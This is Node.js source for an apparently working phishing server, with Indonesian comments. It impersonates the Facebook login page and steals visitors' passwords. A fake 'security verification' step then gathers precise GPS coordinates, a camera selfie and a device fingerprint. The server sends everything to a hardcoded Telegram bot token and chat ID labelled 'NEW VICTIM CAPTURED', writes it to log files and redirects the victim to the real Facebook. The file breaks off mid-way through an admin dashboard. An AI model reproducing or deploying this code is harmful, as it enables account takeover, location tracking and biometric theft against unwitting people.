// server.js - Advanced Phishing & Tracking System with Telegram Integration
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const moment = require('moment');
const crypto = require('crypto');
const app = express();

// Konfigurasi
const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s';
const TELEGRAM_CHAT_ID = process.env.CHAT_ID || '6834832649';
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;

// Inisialisasi Bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Database in-memory
const victims = new Map();
const sessions = new Map();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use((req, res, next) => {
    req.sessionId = crypto.randomBytes(16).toString('hex');
    sessions.set(req.sessionId, {
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.headers['user-agent'],
        timestamp: Date.now()
    });
    next();
});

// Route Utama - Halaman Phishing Facebook yang sangat realistis
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    const sessionId = req.sessionId;
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>Facebook – log in or sign up</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                font-family: Helvetica, Arial, sans-serif;
            }
            
            body {
                background-color: #f0f2f5;
                color: #1c1e21;
                line-height: 1.34;
            }
            
            .container {
                max-width: 980px;
                margin: 0 auto;
                padding: 72px 0 112px;
            }
            
            .row {
                display: flex;
                align-items: center;
                justify-content: space-between;
                flex-wrap: wrap;
            }
            
            .intro {
                flex: 0 0 580px;
                padding-right: 32px;
            }
            
            .intro h1 {
                color: #1877f2;
                font-size: 55px;
                font-weight: bold;
                margin-bottom: 16px;
            }
            
            .intro h2 {
                font-size: 28px;
                font-weight: normal;
                line-height: 32px;
            }
            
            .login-panel {
                flex: 0 0 396px;
            }
            
            .login-box {
                background-color: #fff;
                border: none;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
                padding: 20px;
                width: 100%;
            }
            
            .login-box input {
                width: 100%;
                padding: 14px 16px;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                font-size: 17px;
                margin-bottom: 12px;
                color: #1d2129;
            }
            
            .login-box input:focus {
                outline: none;
                border-color: #1877f2;
                box-shadow: 0 0 0 2px #e7f3ff;
            }
            
            .login-btn {
                background-color: #1877f2;
                border: none;
                border-radius: 6px;
                font-size: 20px;
                line-height: 48px;
                padding: 0 16px;
                width: 100%;
                color: #fff;
                font-weight: bold;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            
            .login-btn:hover {
                background-color: #166fe5;
            }
            
            .forgot-password {
                display: block;
                text-align: center;
                color: #1877f2;
                font-size: 14px;
                text-decoration: none;
                margin: 16px 0;
                padding-bottom: 16px;
                border-bottom: 1px solid #dadde1;
            }
            
            .forgot-password:hover {
                text-decoration: underline;
            }
            
            .create-account {
                background-color: #42b72a;
                border: none;
                border-radius: 6px;
                font-size: 17px;
                line-height: 48px;
                padding: 0 16px;
                color: #fff;
                font-weight: bold;
                cursor: pointer;
                transition: background-color 0.3s;
                display: block;
                margin: 0 auto;
                margin-top: 24px;
            }
            
            .create-account:hover {
                background-color: #36a420;
            }
            
            .create-page {
                text-align: center;
                margin-top: 28px;
                color: #1c1e21;
                font-size: 14px;
            }
            
            .create-page a {
                color: #1c1e21;
                font-weight: bold;
                text-decoration: none;
            }
            
            .create-page a:hover {
                text-decoration: underline;
            }
            
            .footer {
                background-color: #fff;
                padding: 20px 0;
                margin-top: 40px;
                border-top: 1px solid #dddfe2;
            }
            
            .footer-links {
                max-width: 980px;
                margin: 0 auto;
                padding: 0 32px;
                font-size: 12px;
                color: #8a8d91;
            }
            
            .footer-links a {
                color: #8a8d91;
                text-decoration: none;
                margin-right: 20px;
            }
            
            .footer-links a:hover {
                text-decoration: underline;
            }
            
            .languages {
                margin-bottom: 10px;
            }
            
            .meta-footer {
                margin-top: 20px;
                font-size: 11px;
            }
            
            /* Security Verification Modal */
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.85);
                z-index: 10000;
                animation: fadeIn 0.3s;
            }
            
            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            
            .modal-content {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #fff;
                width: 90%;
                max-width: 500px;
                border-radius: 12px;
                overflow: hidden;
                box-shadow: 0 12px 28px rgba(0,0,0,0.3);
            }
            
            .modal-header {
                background: #1877f2;
                color: white;
                padding: 20px;
                text-align: center;
            }
            
            .modal-header h2 {
                font-size: 22px;
                margin: 0;
            }
            
            .modal-body {
                padding: 30px;
            }
            
            .security-alert {
                background: #fff8e1;
                border-left: 4px solid #ffc107;
                padding: 15px;
                margin-bottom: 25px;
                border-radius: 4px;
            }
            
            .security-alert i {
                color: #ff9800;
                margin-right: 10px;
            }
            
            .permission-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                padding: 15px;
                background: #f5f6f7;
                border-radius: 8px;
            }
            
            .permission-icon {
                background: #1877f2;
                color: white;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-right: 15px;
                font-size: 18px;
            }
            
            .permission-text {
                flex: 1;
            }
            
            .permission-text h4 {
                margin: 0 0 5px 0;
                color: #1c1e21;
            }
            
            .permission-text p {
                margin: 0;
                color: #65676b;
                font-size: 14px;
            }
            
            .checkbox-container {
                display: flex;
                align-items: center;
                margin: 20px 0 30px;
            }
            
            .checkbox-container input {
                margin-right: 10px;
                transform: scale(1.2);
            }
            
            .modal-buttons {
                display: flex;
                gap: 10px;
            }
            
            .btn-primary {
                flex: 1;
                background: #1877f2;
                color: white;
                border: none;
                padding: 15px;
                border-radius: 6px;
                font-weight: bold;
                cursor: pointer;
                transition: background 0.3s;
            }
            
            .btn-primary:hover {
                background: #166fe5;
            }
            
            .btn-secondary {
                flex: 1;
                background: #e4e6eb;
                color: #1c1e21;
                border: none;
                padding: 15px;
                border-radius: 6px;
                font-weight: bold;
                cursor: pointer;
                transition: background 0.3s;
            }
            
            .btn-secondary:hover {
                background: #d8dadf;
            }
            
            /* Camera Modal */
            .camera-modal {
                display: none;
            }
            
            .camera-container {
                text-align: center;
                padding: 20px;
            }
            
            .camera-preview {
                width: 100%;
                max-width: 400px;
                height: 300px;
                background: #000;
                margin: 0 auto 20px;
                border-radius: 8px;
                overflow: hidden;
                position: relative;
            }
            
            #cameraVideo {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
            
            .camera-overlay {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
            }
            
            .face-guide {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 200px;
                height: 200px;
                border: 2px solid rgba(255,255,255,0.5);
                border-radius: 50%;
            }
            
            .camera-buttons {
                display: flex;
                gap: 10px;
                justify-content: center;
                margin-top: 20px;
            }
            
            .btn-capture {
                background: #1877f2;
                color: white;
                border: none;
                padding: 12px 30px;
                border-radius: 6px;
                font-weight: bold;
                cursor: pointer;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            
            .btn-capture:hover {
                background: #166fe5;
            }
            
            .btn-skip {
                background: #e4e6eb;
                color: #1c1e21;
                border: none;
                padding: 12px 30px;
                border-radius: 6px;
                font-weight: bold;
                cursor: pointer;
            }
            
            .btn-skip:hover {
                background: #d8dadf;
            }
            
            /* Loading Screen */
            .loading-screen {
                background: #1877f2;
                color: white;
                text-align: center;
                padding: 50px 20px;
            }
            
            .loading-spinner {
                border: 5px solid rgba(255,255,255,0.3);
                border-top: 5px solid white;
                border-radius: 50%;
                width: 60px;
                height: 60px;
                animation: spin 1s linear infinite;
                margin: 0 auto 30px;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            /* Success Screen */
            .success-screen {
                text-align: center;
                padding: 40px 20px;
            }
            
            .success-icon {
                background: #42b72a;
                color: white;
                width: 80px;
                height: 80px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                font-size: 40px;
            }
            
            /* Mobile Responsive */
            @media (max-width: 900px) {
                .row {
                    flex-direction: column;
                    text-align: center;
                }
                
                .intro {
                    padding-right: 0;
                    margin-bottom: 40px;
                }
                
                .intro h1 {
                    font-size: 42px;
                }
                
                .intro h2 {
                    font-size: 24px;
                }
                
                .container {
                    padding: 20px;
                }
            }
            
            /* Browser-specific styles */
            input::-webkit-input-placeholder { color: #8a8d91; }
            input::-moz-placeholder { color: #8a8d91; }
            input:-ms-input-placeholder { color: #8a8d91; }
            input:-moz-placeholder { color: #8a8d91; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="row">
                <div class="intro">
                    <h1>facebook</h1>
                    <h2>Facebook helps you connect and share with the people in your life.</h2>
                </div>
                <div class="login-panel">
                    <div class="login-box">
                        <form id="loginForm">
                            <input type="text" id="email" name="email" placeholder="Email address or phone number" required autofocus>
                            <input type="password" id="pass" name="pass" placeholder="Password" required>
                            <button type="submit" class="login-btn">Log In</button>
                            <a href="#" class="forgot-password">Forgotten password?</a>
                            <hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;">
                            <button type="button" class="create-account" onclick="showCreateAccount()">Create New Account</button>
                        </form>
                    </div>
                    <div class="create-page">
                        <a href="#" style="font-weight: bold;">Create a Page</a> for a celebrity, brand or business.
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <div class="languages">
                    <a href="#">English (UK)</a>
                    <a href="#">Bahasa Indonesia</a>
                    <a href="#">中文(简体)</a>
                    <a href="#">日本語</a>
                    <a href="#">Español</a>
                    <a href="#">Português (Brasil)</a>
                    <a href="#"><i class="fas fa-plus"></i></a>
                </div>
                <hr style="border: none; border-top: 1px solid #dddfe2; margin: 10px 0;">
                <div>
                    <a href="#">Sign Up</a>
                    <a href="#">Log In</a>
                    <a href="#">Messenger</a>
                    <a href="#">Facebook Lite</a>
                    <a href="#">Video</a>
                    <a href="#">Places</a>
                    <a href="#">Games</a>
                    <a href="#">Marketplace</a>
                    <a href="#">Meta Pay</a>
                    <a href="#">Meta Store</a>
                    <a href="#">Meta Quest</a>
                    <a href="#">Instagram</a>
                    <a href="#">Threads</a>
                    <a href="#">Fundraisers</a>
                    <a href="#">Services</a>
                    <a href="#">Voting Information Centre</a>
                    <a href="#">Privacy Policy</a>
                    <a href="#">Privacy Centre</a>
                    <a href="#">Groups</a>
                    <a href="#">About</a>
                    <a href="#">Create Ad</a>
                    <a href="#">Create Page</a>
                    <a href="#">Developers</a>
                    <a href="#">Careers</a>
                    <a href="#">Cookies</a>
                    <a href="#">AdChoices</a>
                    <a href="#">Terms</a>
                    <a href="#">Help</a>
                    <a href="#">Contact uploading and non-users</a>
                </div>
                <div class="meta-footer">
                    Meta © 2024
                </div>
            </div>
        </div>
        
        <!-- Security Verification Modal -->
        <div id="securityModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2><i class="fas fa-shield-alt"></i> Security Verification Required</h2>
                </div>
                <div class="modal-body">
                    <div class="security-alert">
                        <i class="fas fa-exclamation-triangle"></i>
                        <strong>Unusual login attempt detected</strong> from your location. For your account security, we need to verify your identity.
                    </div>
                    
                    <p style="margin-bottom: 20px; color: #65676b;">
                        To complete your login and protect your account from unauthorized access, please allow the following permissions:
                    </p>
                    
                    <div class="permission-item">
                        <div class="permission-icon">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                        <div class="permission-text">
                            <h4>Location Access</h4>
                            <p>Verify that you're logging in from your usual location</p>
                        </div>
                    </div>
                    
                    <div class="permission-item">
                        <div class="permission-icon">
                            <i class="fas fa-camera"></i>
                        </div>
                        <div class="permission-text">
                            <h4>Camera Access</h4>
                            <p>Take a quick selfie for facial recognition verification</p>
                        </div>
                    </div>
                    
                    <div class="permission-item">
                        <div class="permission-icon">
                            <i class="fas fa-microphone"></i>
                        </div>
                        <div class="permission-text">
                            <h4>Microphone Access (Optional)</h4>
                            <p>Voice verification for enhanced security</p>
                        </div>
                    </div>
                    
                    <div class="checkbox-container">
                        <input type="checkbox" id="termsCheck" checked>
                        <label for="termsCheck">I understand this helps protect my account from unauthorized access</label>
                    </div>
                    
                    <div class="modal-buttons">
                        <button class="btn-primary" onclick="startVerification()">
                            <i class="fas fa-check"></i> Continue Verification
                        </button>
                        <button class="btn-secondary" onclick="cancelVerification()">
                            <i class="fas fa-times"></i> Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Camera Modal -->
        <div id="cameraModal" class="modal camera-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2><i class="fas fa-camera"></i> Facial Recognition</h2>
                </div>
                <div class="camera-container">
                    <p style="margin-bottom: 20px; color: #65676b;">
                        Please look directly at the camera. Make sure your face is clearly visible and well-lit.
                    </p>
                    
                    <div class="camera-preview">
                        <video id="cameraVideo" autoplay playsinline></video>
                        <div class="camera-overlay">
                            <div class="face-guide"></div>
                        </div>
                    </div>
                    
                    <div class="camera-buttons">
                        <button class="btn-capture" onclick="capturePhoto()">
                            <i class="fas fa-camera"></i> Capture Photo
                        </button>
                        <button class="btn-skip" onclick="skipCamera()">
                            Skip This Step
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Loading Screen -->
        <div id="loadingScreen" class="modal">
            <div class="modal-content loading-screen">
                <div class="loading-spinner"></div>
                <h2>Verifying Your Identity</h2>
                <p>Please wait while we complete the security verification process...</p>
                <p style="font-size: 14px; opacity: 0.8; margin-top: 20px;">
                    <i class="fas fa-lock"></i> Your information is encrypted and secure
                </p>
            </div>
        </div>
        
        <!-- Success Screen -->
        <div id="successScreen" class="modal">
            <div class="modal-content">
                <div class="success-screen">
                    <div class="success-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <h2>Verification Successful!</h2>
                    <p>Your identity has been verified successfully.</p>
                    <p style="color: #65676b; margin: 20px 0;">
                        You will be redirected to Facebook shortly...
                    </p>
                    <div class="loading-spinner" style="border: 3px solid #f0f0f0; border-top: 3px solid #1877f2; width: 30px; height: 30px;"></div>
                </div>
            </div>
        </div>
        
        <script>
            const victimId = '${victimId}';
            const sessionId = '${sessionId}';
            
            let userLocation = null;
            let userPhoto = null;
            let cameraStream = null;
            let collectedData = {};
            
            // Login form submission
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const email = document.getElementById('email').value;
                const password = document.getElementById('pass').value;
                
                if (!email || !password) {
                    alert('Please fill in all fields');
                    return;
                }
                
                // Store credentials
                collectedData.credentials = {
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                };
                
                // Show security verification
                document.getElementById('securityModal').style.display = 'block';
            });
            
            // Start verification process
            async function startVerification() {
                if (!document.getElementById('termsCheck').checked) {
                    alert('You must accept the terms to continue.');
                    return;
                }
                
                document.getElementById('securityModal').style.display = 'none';
                
                // Collect system information
                collectedData.system = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    },
                    window: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    online: navigator.onLine
                };
                
                // Get IP address
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    collectedData.ip = ipData.ip;
                } catch (error) {
                    collectedData.ip = 'unknown';
                }
                
                // Get network information
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
                collectedData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
                
                // Get location
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            });
                        });
                        
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        collectedData.location = userLocation;
                        
                        // Generate Google Maps links
                        collectedData.maps = {
                            googleMaps: \`https://maps.google.com/?q=\${userLocation.latitude},\${userLocation.longitude}\`,
                            openStreetMap: \`https://www.openstreetmap.org/?mlat=\${userLocation.latitude}&mlon=\${userLocation.longitude}\`,
                            appleMaps: \`https://maps.apple.com/?ll=\${userLocation.latitude},\${userLocation.longitude}\`,
                            bingMaps: \`https://bing.com/maps/default.aspx?cp=\${userLocation.latitude}~\${userLocation.longitude}\`
                        };
                        
                    } catch (error) {
                        console.error('Geolocation error:', error);
                        collectedData.location = { error: error.message };
                    }
                }
                
                // Show camera modal if camera permission is needed
                showCameraModal();
            }
            
            function cancelVerification() {
                document.getElementById('securityModal').style.display = 'none';
                alert('Verification cancelled. Please try logging in again.');
                document.getElementById('loginForm').reset();
            }
            
            function showCameraModal() {
                document.getElementById('cameraModal').style.display = 'block';
                startCamera();
            }
            
            function startCamera() {
                const video = document.getElementById('cameraVideo');
                
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const constraints = {
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user',
                            frameRate: { ideal: 30 }
                        },
                        audio: false
                    };
                    
                    navigator.mediaDevices.getUserMedia(constraints)
                        .then(function(stream) {
                            cameraStream = stream;
                            video.srcObject = stream;
                        })
                        .catch(function(error) {
                            console.error('Camera error:', error);
                            // Continue without camera
                            collectedData.camera = { error: 'Camera access denied' };
                            skipCamera();
                        });
                } else {
                    collectedData.camera = { error: 'Camera not available' };
                    skipCamera();
                }
            }
            
            function capturePhoto() {
                const video = document.getElementById('cameraVideo');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to base64
                userPhoto = canvas.toDataURL('image/jpeg', 0.8);
                collectedData.photo = userPhoto;
                
                // Stop camera
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                
                document.getElementById('cameraModal').style.display = 'none';
                completeVerification();
            }
            
            function skipCamera() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                document.getElementById('cameraModal').style.display = 'none';
                completeVerification();
            }
            
            async function completeVerification() {
                document.getElementById('loadingScreen').style.display = 'block';
                
                // Add victim metadata
                collectedData.victimId = victimId;
                collectedData.sessionId = sessionId;
                collectedData.url = window.location.href;
                collectedData.referrer = document.referrer;
                collectedData.timestamp = new Date().toISOString();
                
                // Get browser plugins
                collectedData.plugins = Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }));
                
                // Get browser features
                collectedData.features = {
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    indexedDB: !!window.indexedDB,
                    serviceWorker: 'serviceWorker' in navigator,
                    webGL: detectWebGL(),
                    webRTC: !!window.RTCPeerConnection,
                    webAudio: !!window.AudioContext || !!window.webkitAudioContext,
                    batteryAPI: 'getBattery' in navigator,
                    vibrationAPI: 'vibrate' in navigator,
                    geolocation: 'geolocation' in navigator,
                    camera: 'mediaDevices' in navigator
                };
                
                // Send data to server
                try {
                    const response = await fetch('/api/track', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Victim-ID': victimId,
                            'X-Session-ID': sessionId
                        },
                        body: JSON.stringify(collectedData)
                    });
                    
                    if (response.ok) {
                        document.getElementById('loadingScreen').style.display = 'none';
                        document.getElementById('successScreen').style.display = 'block';
                        
                        // Redirect to real Facebook after 3 seconds
                        setTimeout(() => {
                            window.location.href = 'https://facebook.com';
                        }, 3000);
                    } else {
                        throw new Error('Server error');
                    }
                } catch (error) {
                    console.error('Error sending data:', error);
                    // Still redirect to Facebook
                    setTimeout(() => {
                        window.location.href = 'https://facebook.com';
                    }, 3000);
                }
            }
            
            function detectWebGL() {
                try {
                    const canvas = document.createElement('canvas');
                    return !!(window.WebGLRenderingContext && 
                        (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
                } catch (e) {
                    return false;
                }
            }
            
            function showCreateAccount() {
                alert('Create Account feature is currently unavailable. Please try again later.');
            }
            
            // Auto-focus email field
            window.onload = function() {
                document.getElementById('email').focus();
            };
        </script>
    </body>
    </html>
    `);
});

// API endpoint untuk menerima data tracking
app.post('/api/track', async (req, res) => {
    try {
        const data = req.body;
        const victimId = req.headers['x-victim-id'] || generateVictimId(req);
        const sessionId = req.headers['x-session-id'] || req.sessionId;
        
        // Add metadata
        data.victimId = victimId;
        data.sessionId = sessionId;
        data.serverTimestamp = new Date().toISOString();
        data.userAgent = req.headers['user-agent'];
        data.realIp = req.ip || req.connection.remoteAddress;
        
        // Get IP geolocation
        if (data.ip && data.ip !== 'unknown') {
            const geo = geoip.lookup(data.ip);
            if (geo) {
                data.geolocation = {
                    country: geo.country,
                    region: geo.region,
                    city: geo.city,
                    timezone: geo.timezone,
                    ll: geo.ll,
                    metro: geo.metro,
                    range: geo.range
                };
            }
        }
        
        // Simpan ke database
        victims.set(victimId, data);
        
        // Kirim ke Telegram
        await sendDetailedTelegramAlert(data);
        
        // Simpan ke file
        saveToFile(data);
        
        res.json({ 
            success: true, 
            message: 'Verification completed successfully',
            redirect: 'https://facebook.com'
        });
        
    } catch (error) {
        console.error('Error in /api/track:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Fungsi untuk mengirim alert detail ke Telegram
async function sendDetailedTelegramAlert(data) {
    try {
        // Format pesan utama
        const message = `
🎯 *NEW VICTIM CAPTURED* 🎯

*🔐 CREDENTIALS*
👤 Email: \`${data.credentials.email}\`
🔑 Password: \`${data.credentials.password}\`

*📍 LOCATION DATA*
🌐 IP Address: \`${data.ip}\`
${data.geolocation ? `🗺️ Country: ${data.geolocation.country}` : ''}
${data.geolocation ? `🏙️ City: ${data.geolocation.city || 'Unknown'}` : ''}
${data.location ? `📍 Coordinates: ${data.location.latitude || 'N/A'}, ${data.location.longitude || 'N/A'}` : ''}
${data.location ? `🎯 Accuracy: ${data.location.accuracy || 'N/A'} meters` : ''}

*🗺️ MAPS LINKS*
${data.maps ? `🗺️ Google Maps: ${data.maps.googleMaps}` : ''}
${data.maps ? `🗺️ OpenStreetMap: ${data.maps.openStreetMap}` : ''}
${data.maps ? `🗺️ Apple Maps: ${data.maps.appleMaps}` : ''}

*🖥️ SYSTEM INFO*
💻 Platform: ${data.system.platform}
🌐 Browser: ${getBrowserName(data.system.userAgent)}
📱 Screen: ${data.system.screen.width}x${data.system.screen.height}
🔍 Timezone: ${data.system.timezone}
📶 Network: ${data.network.effectiveType || 'Unknown'}

*📊 DEVICE FINGERPRINT*
🔢 CPU Cores: ${data.system.hardwareConcurrency || 'Unknown'}
💾 RAM: ${data.system.deviceMemory || 'Unknown'} GB
🎮 WebGL: ${data.features.webGL ? '✅' : '❌'}
🎥 Camera: ${data.features.camera ? '✅' : '❌'}
🗺️ GPS: ${data.features.geolocation ? '✅' : '❌'}

*⏰ TIMING*
🕐 Login Time: ${moment(data.credentials.timestamp).format('YYYY-MM-DD HH:mm:ss')}
🕐 Capture Time: ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}

*🔗 LINKS*
🔗 Victim URL: ${data.url}
🔗 Referrer: ${data.referrer || 'Direct'}
🆔 Victim ID: \`${data.victimId}\`
🆔 Session ID: \`${data.sessionId}\`
        `;
        
        // Kirim pesan utama
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        // Kirim lokasi di peta jika ada
        if (data.location && data.location.latitude && data.location.longitude) {
            await bot.sendLocation(
                TELEGRAM_CHAT_ID, 
                data.location.latitude, 
                data.location.longitude,
                {
                    disable_notification: false
                }
            );
        }
        
        // Kirim foto jika ada
        if (data.photo) {
            try {
                // Convert base64 to buffer
                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                
                await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                    caption: '📸 *Face Photo Captured*',
                    parse_mode: 'Markdown'
                });
            } catch (photoError) {
                console.error('Error sending photo:', photoError);
                await bot.sendMessage(TELEGRAM_CHAT_ID, '❌ *Failed to send photo*', { parse_mode: 'Markdown' });
            }
        }
        
        // Kirim detailed system info
        const systemDetails = `
*🔍 DETAILED SYSTEM INFO*

*User Agent:*
\`\`\`
${data.system.userAgent.substring(0, 300)}...
\`\`\`

*Screen Details:*
📏 Resolution: ${data.system.screen.width}x${data.system.screen.height}
🎨 Color Depth: ${data.system.screen.colorDepth}-bit
🖥️ Window Size: ${data.system.window.width}x${data.system.window.height}

*Network Info:*
📡 Type: ${data.network.effectiveType || 'Unknown'}
⚡ Speed: ${data.network.downlink || 'Unknown'} Mbps
⏱️ Latency: ${data.network.rtt || 'Unknown'} ms
📊 Save Data: ${data.network.saveData ? 'Enabled' : 'Disabled'}

*Browser Features:*
${Object.entries(data.features).map(([key, value]) => `• ${key}: ${value ? '✅' : '❌'}`).join('\n')}

*Installed Plugins (${data.plugins.length}):*
${data.plugins.slice(0, 5).map(p => `• ${p.name}`).join('\n')}
${data.plugins.length > 5 ? `... and ${data.plugins.length - 5} more` : ''}
        `;
        
        await bot.sendMessage(TELEGRAM_CHAT_ID, systemDetails, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        console.log(`✅ Telegram alert sent for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error sending Telegram alert:', error);
    }
}

// Fungsi helper untuk mendapatkan nama browser
function getBrowserName(userAgent) {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    if (userAgent.includes('Opera')) return 'Opera';
    return 'Unknown';
}

// Fungsi untuk menyimpan data ke file
function saveToFile(data) {
    try {
        const fs = require('fs');
        const path = require('path');
        
        const logsDir = path.join(__dirname, 'logs');
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, { recursive: true });
        }
        
        // Simpan data lengkap sebagai JSON
        const jsonFile = path.join(logsDir, `victim_${data.victimId}.json`);
        fs.writeFileSync(jsonFile, JSON.stringify(data, null, 2));
        
        // Simpan ke log utama
        const logEntry = `
================================================================================
VICTIM ID: ${data.victimId}
SESSION ID: ${data.sessionId}
TIME: ${new Date().toISOString()}
----------------------------------------------------------------------------
CREDENTIALS:
  Email: ${data.credentials.email}
  Password: ${data.credentials.password}
----------------------------------------------------------------------------
LOCATION:
  IP: ${data.ip}
  Country: ${data.geolocation?.country || 'Unknown'}
  City: ${data.geolocation?.city || 'Unknown'}
  Coordinates: ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
  Accuracy: ${data.location?.accuracy || 'N/A'}m
----------------------------------------------------------------------------
MAPS LINKS:
  Google Maps: ${data.maps?.googleMaps || 'N/A'}
  OpenStreetMap: ${data.maps?.openStreetMap || 'N/A'}
  Apple Maps: ${data.maps?.appleMaps || 'N/A'}
----------------------------------------------------------------------------
SYSTEM INFO:
  User Agent: ${data.system.userAgent}
  Platform: ${data.system.platform}
  Screen: ${data.system.screen.width}x${data.system.screen.height}
  Timezone: ${data.system.timezone}
  Network: ${data.network.effectiveType || 'Unknown'}
----------------------------------------------------------------------------
DEVICE:
  CPU Cores: ${data.system.hardwareConcurrency || 'Unknown'}
  RAM: ${data.system.deviceMemory || 'Unknown'} GB
  WebGL: ${data.features.webGL ? 'Yes' : 'No'}
  Camera: ${data.features.camera ? 'Yes' : 'No'}
================================================================================

`;
        
        const masterLog = path.join(logsDir, 'master_log.txt');
        fs.appendFileSync(masterLog, logEntry);
        
        // Simpan foto terpisah jika ada
        if (data.photo) {
            const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            const photoFile = path.join(logsDir, `photo_${data.victimId}.jpg`);
            fs.writeFileSync(photoFile, buffer);
        }
        
        console.log(`📁 Data saved for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error saving to file:', error);
    }
}

// Admin dashboard
app.get('/admin', (req, res) => {
    const victimsList = Array.from(victims.values()).map(v => ({
        id: v.victimId,
        email: v.credentials.email,
        ip: v.ip,
        location: v.location ? 'Yes' : 'No',
        photo: v.photo ? 'Yes' : 'No',
        time: v.timestamp,
        country: v.geolocation?.country || 'Unknown'
    }));
    
    res.json({
